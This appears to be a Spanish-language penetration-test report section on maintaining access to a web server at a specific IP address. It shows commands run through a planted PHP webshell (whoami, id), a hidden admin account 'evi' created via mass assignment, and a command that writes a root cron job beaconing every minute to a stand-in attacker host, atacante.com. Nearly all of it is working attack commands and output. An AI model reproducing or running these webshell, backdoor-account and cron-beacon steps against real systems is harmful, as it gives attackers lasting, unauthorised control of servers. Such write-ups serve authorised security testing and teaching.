# Fase 4 - Mantenimiento del Acceso (Maintaining Access)

**Target:** http://37.60.230.11

---

## Backdoors instalados

### Webshell persistente (/uploads/shell.php)
```bash
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=whoami"
www-data

$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=id"
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```
La webshell permanece accesible mientras el archivo no sea eliminado del directorio `/var/www/html/uploads/`.

### Usuario admin persistente (Mass Assignment)
```bash
$ curl -s -o /dev/null -w "%{http_code}" http://37.60.230.11/admin/usuarios
HTTP 200
```
Usuario `evi` con rol `admin` creado via Mass Assignment. Permite acceso administrativo permanente al sistema.

---

## Persistencia

```bash
# Programar cron job para beacon (opcional)
$ curl -s "http://37.60.230.11/uploads/shell.php?cmd=echo%20%27*%20*%20*%20*%20*%20root%20curl%20http://atacante.com/beacon%27%20%3E%20/etc/cron.d/beacon"
```
